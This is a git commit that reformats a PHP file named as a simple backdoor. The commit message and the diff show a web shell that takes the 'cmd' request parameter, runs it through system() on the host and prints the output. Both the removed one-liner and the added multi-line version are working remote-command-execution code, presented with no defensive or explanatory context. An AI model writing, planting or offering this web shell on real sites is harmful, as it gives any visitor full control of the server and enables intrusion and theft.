da6a8d5af459b44b26ee5f2e6b7994178b015531
Aiden Valentine <aiden@xxxmultimedia.com>
2022-01-31 10:20:18 -0500

    Update php-backdoor-simple-system-cmd.php

--- php-backdoor-simple-system-cmd.php
+++ php-backdoor-simple-system-cmd.php
@@ -1,1 +1,10 @@
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php
+/** Get query var "cmd" and run it as a linux command against the host system. */
+if(isset($_REQUEST['cmd'])) {
+  echo "<pre>";
+  $cmd = ($_REQUEST['cmd']);
+  system($cmd);
+  echo "</pre>";
+  die;
+}
+?>
